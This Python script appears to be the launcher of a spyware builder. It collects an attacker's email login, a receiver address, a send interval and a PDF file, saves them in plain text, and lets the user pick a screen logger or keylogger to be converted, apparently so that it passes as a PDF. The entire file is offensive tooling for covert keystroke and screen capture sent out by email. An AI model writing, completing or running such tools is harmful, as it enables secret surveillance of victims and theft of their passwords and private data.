import os
import convertExe
import sys
from colorama import init, Fore, Style

def display_logo():
    init()  # Initialize colorama
    logo = f"""
    {Fore.RED}#####   #####  #    # 
    {Fore.GREEN}#    #  #    # ##   # 
    {Fore.YELLOW}#####   #####  # #  # 
    {Fore.BLUE}#   #   #      #  # # 
    {Fore.MAGENTA}#    #  #      #   ## {Style.RESET_ALL}
    """
    print(logo)

def get_credentials():
    credentials_file = "credentials.txt"
    if not os.path.exists(credentials_file):
        send_mail = input("[+] Enter your email address: ")
        password = input("[+] Enter your email password: ")
        receiver_mail = input("[+] Enter the receiver's email address: ")
        interval = input("[+] Enter the interval in seconds: ")
        pdf_location = input("[+] Enter the PDF file location: ")
        with open(credentials_file, 'w') as f:
            f.write(f"{send_mail}\n{password}\n{receiver_mail}\n{interval}\n{pdf_location}")
    else:
        print("[+] You want change your credentials?: y/n")
        if input().lower() == "y":
            send_mail = input("[+] Enter your email address: ")
            password = input("[+] Enter your email password: ")
            receiver_mail = input("[+] Enter the receiver's email address: ")
            interval = input("[+] Enter the interval in seconds: ")
            pdf_location = input("[+] Enter the PDF file location: ")
            with open(credentials_file, 'w') as f:
                f.write(f"{send_mail}\n{password}\n{receiver_mail}\n{interval}\n{pdf_location}")

        with open(credentials_file, 'r') as f:
            send_mail, password, receiver_mail, interval, pdf_location = f.read().splitlines()
    return send_mail, password, receiver_mail, int(interval), pdf_location

def main():
    display_logo()
    send_mail, password, receiver_mail, interval, pdf_location = get_credentials()
    
    print("Choose a tool:")
    print("1) Screen Logger")
    print("2) Key Logger")
    print("3) EXIT")
    choice = input("[+] Enter your choice (1/2): ").strip()

    if choice == "1":
        # Call ScreenLogger functionality here
        convertExe.convert_exe_to_format("aScreenlogger.py", "screenlogger", pdf_location)

    elif choice == "2":
        convertExe.convert_exe_to_format("akeylogger.py", "keylogger", pdf_location)
        print("[+] Key Logger selected.")
        # Call KeyLogger functionality here
    else:
        exit()

if __name__ == "__main__":
    main()